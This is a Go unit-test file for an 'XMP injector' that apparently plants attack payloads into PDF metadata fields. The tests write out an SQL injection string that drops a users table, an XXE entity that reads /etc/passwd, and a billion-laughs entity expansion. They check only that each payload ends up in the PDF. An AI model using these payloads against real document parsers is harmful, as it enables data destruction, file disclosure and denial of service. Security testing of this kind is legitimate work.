package injectors

import (
	"bytes"
	"testing"

	"github.com/novusedge/hirejack/internal/pdf"
)

func TestXMPInjector_InjectFields(t *testing.T) {
	p, err := pdf.Parse(pdf.CreateTestPDF())
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}

	injector := NewXMPInjector()

	err = injector.Inject(p, XMPConfig{
		Creator: "'; DROP TABLE users; --",
		Title:   "Test Document",
	})
	if err != nil {
		t.Fatalf("Inject: %v", err)
	}

	xmp, err := p.GetXMP()
	if err != nil {
		t.Fatalf("GetXMP: %v", err)
	}
	if xmp == nil {
		t.Fatal("XMP should exist")
	}
	if !bytes.Contains(xmp.Raw, []byte("DROP TABLE")) {
		t.Error("XMP should contain payload")
	}
}

func TestXMPInjector_XXE(t *testing.T) {
	p, _ := pdf.Parse(pdf.CreateTestPDF())
	injector := NewXMPInjector()

	err := injector.InjectXXE(p,
		`<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
		"dc:creator",
	)
	if err != nil {
		t.Fatalf("InjectXXE: %v", err)
	}

	xmp, _ := p.GetXMP()
	if xmp == nil {
		t.Fatal("XMP should exist")
	}
	// DOCTYPE is prepended to Raw content
	if !bytes.Contains(xmp.Raw, []byte("DOCTYPE")) {
		t.Error("Raw should contain DOCTYPE")
	}
	if !bytes.Contains(xmp.Raw, []byte("ENTITY xxe")) {
		t.Error("Raw should contain entity definition")
	}
}

func TestXMPInjector_BillionLaughs(t *testing.T) {
	doctype := `<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
]>`

	p, _ := pdf.Parse(pdf.CreateTestPDF())
	injector := NewXMPInjector()

	err := injector.Inject(p, XMPConfig{
		Doctype: doctype,
		Creator: "&lol3;",
	})
	if err != nil {
		t.Fatalf("Inject: %v", err)
	}

	xmp, _ := p.GetXMP()
	if !bytes.Contains(xmp.Raw, []byte("&lol3;")) {
		t.Error("XMP should contain entity reference")
	}
}

func TestXMPInjector_InjectFieldsMap(t *testing.T) {
	p, _ := pdf.Parse(pdf.CreateTestPDF())
	injector := NewXMPInjector()

	fields := map[string]string{
		"dc:creator":     "creator payload",
		"dc:description": "desc payload",
	}

	err := injector.InjectFields(p, fields)
	if err != nil {
		t.Fatalf("InjectFields: %v", err)
	}

	xmp, _ := p.GetXMP()
	if !bytes.Contains(xmp.Raw, []byte("creator payload")) {
		t.Error("XMP should contain creator payload")
	}
	if !bytes.Contains(xmp.Raw, []byte("desc payload")) {
		t.Error("XMP should contain description payload")
	}
}

func TestXMPInjector_PreserveExisting(t *testing.T) {
	p, _ := pdf.Parse(pdf.CreateTestPDF())
	injector := NewXMPInjector()

	// Set initial
	injector.Inject(p, XMPConfig{Creator: "first", Title: "original"})

	// Get XMP and check
	xmp1, _ := p.GetXMP()
	if !bytes.Contains(xmp1.Raw, []byte("first")) {
		t.Error("first creator should be set")
	}
}

func TestXMPInjector_XXEVariousFields(t *testing.T) {
	fields := []string{"dc:creator", "dc:title", "dc:description", "dc:subject"}

	for _, field := range fields {
		t.Run(field, func(t *testing.T) {
			p, _ := pdf.Parse(pdf.CreateTestPDF())
			injector := NewXMPInjector()

			err := injector.InjectXXE(p, `<!ENTITY xxe "test">`, field)
			if err != nil {
				t.Errorf("InjectXXE(%s): %v", field, err)
			}

			xmp, _ := p.GetXMP()
			if !bytes.Contains(xmp.Raw, []byte("&xxe;")) {
				t.Errorf("%s should contain entity reference", field)
			}
		})
	}
}
